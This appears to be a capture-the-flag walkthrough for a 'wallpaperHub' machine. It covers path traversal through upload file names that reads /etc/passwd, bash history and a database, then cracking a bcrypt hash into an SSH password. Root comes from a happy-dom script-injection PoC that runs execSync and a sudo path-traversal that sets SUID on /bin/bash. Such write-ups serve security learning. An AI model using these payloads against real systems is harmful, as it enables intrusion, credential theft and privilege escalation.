nmap shows ports 22, 80, 5000 open
port 80 is default
port 5000 is a wallpaperHub website, where default creds dont work, so we register using test:test. Once done, we get to upload an image.
Tried to upload php rev shell, which did not however, give a rev shell.

Hint Taken : File names should be the file we want to read, like `../../../../etc/passwd`

Now, we can lookup a few files
```zsh
../../../../../../etc/passwd
#user wp_hub
../../../../../../home/wp_hub/.ssh/id_rsa
#not found
../../../../../../home/wp_hub/.bash_history
#sqlite ~/wallpaper_hub/database.db
../../../../../../home/wp_hub/wallpaper_hub/database.db

sqlite3 database.db .dump
#$2b$12$lgsrjRa0imePu9iSnp1UsOPLWqAKKYym/z5R59UijsYZ5ss1nwijS
john -> wp_hub : qazwsxedc

#Alternatively, we can guess and check some config files like
/var/www/html/config.php
/var/www/config.php
/etc/apache2/apache2.conf
/proc/self/cwd/config.php
/proc/self/cwd/database.db
/proc/self/cwd/db.py
```
Note - `/proc/self/cwd` references the current dir, so helpful to look for files blindly in the current directory

anyways, with the password, we can ssh to wp_hub
ssh wp_hub@IP
wp_hub!

---
`sudo -l`
`(root) NOPASSWD: /usr/bin/web-scraper /root/web_src_downloaded/*.html`
`ls -la /usr/bin/web-scraper` shows it is a symlink to `/opt/scraper/scraper.js`
Looking at `/opt/scraper/scraper.js`, we see it uses a happy-dom library

Googling happy-dom exploits, we find https://security.snyk.io/vuln/SNYK-JS-HAPPYDOM-8350065
For the POC, they show how we can run any script, by including a localhost src
```js POC
const { Window } = require("happy-dom");

const window = new Window();
const document = window.document;
    
document.write(`<script src="https://localhost:8080/'+require('child_process').execSync('id')+'"></script>`);
```

So, we create a new file, exploit.sh
```zsh
cd /dev/shm
echo "chmod +s /bin/bash" > exploit.sh

#Now, create a .html file with the document.write line's <script> tag
#OR
#the whole thing, and change the execSync to point to the file we created
sudo /usr/bin/web-scraper /root/web_src_downloaded/../../../dev/shm/pwn.html
bash -p
```
root!